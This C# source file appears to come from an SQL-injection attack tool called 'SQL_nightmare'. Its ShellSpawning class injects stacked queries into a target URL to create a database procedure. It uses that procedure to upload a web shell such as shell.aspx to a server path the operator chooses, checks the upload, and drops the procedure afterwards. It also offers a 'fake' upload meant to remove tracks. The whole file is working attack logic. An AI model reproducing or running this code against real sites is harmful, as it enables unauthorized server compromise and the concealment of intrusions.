using System;
using System.Collections.Generic;
using System.Text;

namespace SQL_nightmare
{
    class ShellSpawning
    {
        public static void Spawn(string url)
        {
            Log.logNotification("Confirming Web Response..");

            var urlForResponseConfirmation = QueryCrafter.constructURLForConfirmation(url, QueriesDB.Replacement);

            if (ResponseFilter.confirmResponce(urlForResponseConfirmation, QueriesDB.Replacement))
            {
                Log.logNotification("Web Response is OK..");

                if (createProcFcUk(url))
                {
                    string RootPath = "z";
                    while (RootPath != "x")
                    {
                        RootPath = UserInteraction.takeInputString("Press x for Exit..\nEnter root for folder path C:\\websites\\somedir\\ ");
                        if (RootPath != "x")
                        {
                            string fileName = UserInteraction.takeInputString("Enter filename to upload eg. shell.aspx ..");

                            string UrlForUploading = null;
                            
                            string x = UserInteraction.takeInputString("Press 'r' for using Real Shell Contents..\nPress 'f' for fake Shell Contens to remove tracks..");
                            
                            if (x == "f")
                                UrlForUploading = QueryCrafter.constructStackedQuery(url, QueriesDB.FileUploadingQueryFAKE);
                            else
                                UrlForUploading = QueryCrafter.constructStackedQuery(url, QueriesDB.FileUploadingQueryREAL);


                            UrlForUploading = UrlForUploading.Replace("[PATH]", RootPath);
                            UrlForUploading = UrlForUploading.Replace("[FILENAME]", fileName);
                            UrlForUploading = UrlForUploading.Replace("rummykhan", QueriesDB.Replacement);

                            Log.logNotification("Uploading shell to " + RootPath + fileName);

                            if (ResponseFilter.confirmResponce(UrlForUploading, QueriesDB.Replacement))
                            {
                                Log.logNotification("Confirming File Upload..");
                                if (confirmFileUpload(url, RootPath + fileName))
                                    Log.logOutput("Shell uploaded successfully to : " + RootPath + fileName);
                                else
                                    Log.logError("Fail to upload file..");
                            }
                        }
                    }
                }
                dropObject(url, QueriesDB.DropFcUkProcQuery);
            }
            else
                Log.logError("No response from the server..");
        }

        static bool createProcFcUk(string url)
        {
            try
            {
                var FcUkProcCreationURL = QueryCrafter.constructStackedQuery(url, QueriesDB.UploadFileProcQuery);
                FcUkProcCreationURL = QueryCrafter.constructURLForConfirmation(FcUkProcCreationURL, QueriesDB.Replacement);

                if (ResponseFilter.confirmResponce(FcUkProcCreationURL, QueriesDB.Replacement))
                {
                    var FcUkProcConfirmationURL = QueryCrafter.constructQueryForSelectObject(url, QueriesDB.ConfirmFcUkProcQuery);
                    var response = HTTPMethods.getResponse(FcUkProcConfirmationURL);

                    if (response != null)
                    {
                        if (ResponseFilter.getPureResponseWithLastIndex(response) == "FcUk")
                        {
                            Log.logOutput("Procedure to Upload Shell is created..");
                            return true;
                        }
                        else
                        {
                            Log.logError("1 Procedure to Upload Shell cannot be created..");
                            return false;
                        }
                    }
                    else
                    {
                        Log.logError("2 Procedure to Upload Shell cannot be created..");
                        return false;
                    }
                }
                else
                {
                    Log.logError("Erroneous response from the server..");
                    Log.logError("Procedure to Upload Shell cannot be created..");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Log.logError(ex.Message);
                return false;
            }
        }

        static bool dropObject(string url, string ObjectDroppingQuery)
        {
            try
            {
                var DirFuncDroppingQuery = QueryCrafter.constructURLForDroppingObject(url, ObjectDroppingQuery);
                DirFuncDroppingQuery = QueryCrafter.constructURLForConfirmation(DirFuncDroppingQuery, QueriesDB.Replacement);
                if (ResponseFilter.confirmResponce(DirFuncDroppingQuery, QueriesDB.Replacement))
                    return true;
                else
                    return false;
            }
            catch (Exception ex)
            {
                Log.logError(ex.Message);
                return false;
            }
        }

        static bool confirmFileUpload(string url, string rootPathForFile)
        {
            try
            {
                if (ReadFile.ReadFileDirect(url, rootPathForFile) != null)
                    return true;
                else
                    return false;
            }
            catch (Exception ex)
            {
                Log.logError(ex.Message);
                return false;
            }
        }
    }
}
